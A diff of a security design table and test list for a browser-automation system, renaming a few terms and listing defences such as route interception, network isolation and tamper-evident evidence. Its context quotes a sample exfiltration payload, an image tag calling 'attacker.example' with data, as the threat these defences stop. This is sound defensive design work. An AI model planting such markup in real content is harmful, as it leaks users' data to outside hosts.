@@ -12,7 +12,7 @@ Terms in [CONTEXT.md](../CONTEXT.md). The principle: arrange things so the dange
 | 3b | **Route interception.** Every request the browser makes — including ones the page starts by itself (images, scripts, redirects) — is checked against the allowlisted origins and aborted if it fails. This is what stops data leaving via a planted `<img src="https://attacker.example/?data=…">` in a member notes field, which a check-before-we-act rule cannot see. | driver | **TO BUILD** |
 | 4 | **Network isolation.** The browser can reach only that Tenant's origins (container egress allowlist or proxy). Off-domain navigation fails at the network, not at an `if`. Also the real defence against exfiltration via a planted link. | deployment | Design only, not built |
 | 5 | **Credential separation by phase.** The discovery process cannot see production secrets at all — different namespace, different service account. "Discovery can't touch production" becomes a fact, not a flag. | deployment | Design only, not built |
-| 6 | **Two-Person Approval** for any Artifact containing a Consequential Step. Mirrors bank change control. | artifact + check | **TO BUILD** — simplified |
+| 6 | **Two-Person Approval** for any Artifact containing a Consequential Action. Mirrors bank change control. | artifact + check | **TO BUILD** — simplified |
 | 7 | **Tamper-evident Evidence.** Append-only JSONL with a hash chain; a run's history cannot be quietly rewritten. This is what makes an `Outcome Unknown` verdict trustworthy. | evidence sink | Design only, not built |
 | 8 | **Policy layering.** Baseline ∩ Tenant ∩ Needs, checked before every action. | engine | **TO BUILD** |
 | 9 | **Secrets by reference.** Substituted at the moment of typing, below the model, below the log, below the Artifact. | engine | **TO BUILD** |
@@ -27,7 +27,7 @@ None of these exist yet.
 - Replay code cannot import the model SDK (import-graph test).
 - An Artifact naming an action outside the vocabulary is rejected by the schema.
 - An Artifact whose Needs exceed the Policy is Refused before the browser opens.
-- A Tenant Overlay that adds a Step, changes the Contract or widens Needs is rejected.
+- A Tenant Overlay that adds a Transition, changes the Contract or widens Needs is rejected.
 - A redaction canary value never appears in any evidence file, log line or screenshot.
 - A Business Outcome is never retried.
 - Automation and Operator cannot hold control at the same time.
